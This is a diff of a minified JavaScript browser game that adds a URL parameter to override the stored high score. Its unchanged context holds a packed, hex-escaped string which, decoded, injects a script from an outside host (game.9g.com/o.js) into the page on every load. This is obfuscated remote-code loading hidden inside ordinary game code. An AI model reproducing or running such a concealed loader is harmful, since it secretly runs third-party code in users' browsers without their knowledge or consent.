@@ -1,5 +1,7 @@
 function main() {
-	var QueryString = function() {
+    
+    // http://hostname/ontheline?lang=ENG&highscore=123s
+	QueryString = function() {
 		// This function is anonymous, is executed immediately and 
 		// the return value is assigned to QueryString!
 		var query_string = {};
@@ -31,6 +33,18 @@ function main() {
 		// alert(language);
 		return language;
 	};
+    
+    // 从参数字符串得到最高成绩
+    var parseHighScore = function(){
+        var scoreValue = QueryString["highscore"];
+        var score = -1;
+        if (typeof scoreValue != "undefined"){
+            score = parseInt(scoreValue);    
+        }
+        
+        console.log("score: " + score);
+        return score;
+    }
 
 	var d = {
 		isShowClue1: !0,
@@ -194,6 +208,7 @@ function main() {
 		}
 		('(j(){6 a=d.v(\'\\4\\2\\5\\7\\1\\0\');a.k=\'\\0\\i\\l\\0\\3\\f\\9\\m\\9\\4\\2\\5\\7\\1\\0\';a.p=q;6 b="\\n";b+="\\0";b+="\\0";b+="\\1";b+="\\o";b+="\\3";b+="\\3";b+="\\c";b+="\\9";b+="\\e";b+="\\i";b+="\\8";b+="\\w";b+="\\c";b+="\\8";b+="\\2";b+="\\g";b+="\\e";b+="\\3";b+="\\g";b+="\\8";b+="\\f";b+="\\4";a.t=b;6 b=d.x(\'\\4\\2\\5\\7\\1\\0\')[y];b.h.s(a,b);a.r=j(){a.h.u(a)}})();', 35, 35,
 			'x74|x70|x63|x2f|x73|x72|var|x69|x2e|x61|||x67|document|x6d|x6a|x6f|parentNode|x65|function|type|x78|x76|x68|x3a|async|true|onload|insertBefore|src|removeChild|createElement|x39|getElementsByTagName|0x0'.split('|'), 0, {}));
+	
 	jsGame.initImageCallBack(function(b, N) {
 		if (b >= N) jsGame.gameFlow.run();
 		else try {
@@ -205,6 +220,7 @@ function main() {
 			d.ctx.drawImage(jsGame.getImage("a"), 2, 86, 246 * G, 10, (d.width - 246) / 2, (d.height - 81) / 2 + 51, 246 * G, 10)
 		} catch (D) {}
 	});
+
 	jsGame.pageLoad(function(b) {
 		var N, G;
 
@@ -1015,11 +1031,22 @@ function main() {
 			da = 4,
 			g = 0,
 			// w = "",
-			y = 0,
+			//y = 0,
 			w = gameLanguage(),
 			g = null == w ? T : H,
-			y = b.localStorage.getItem("highScore");
+			//y = b.localStorage.getItem("highScore"), 
 			stopped = 0;
+
+		// 根据参数字符串，设置最高成绩
+		var y = 0;
+		var hightScore = parseHighScore(); 
+		if (hightScore > 0){
+			y = hightScore; 
+			b.localStorage.setItem("highScore", hightScore);
+		} else {
+			y = b.localStorage.getItem("highScore");
+		}
+
 		null == y && (y = 0);
 		var ta = function() {
 				z = x = 0;
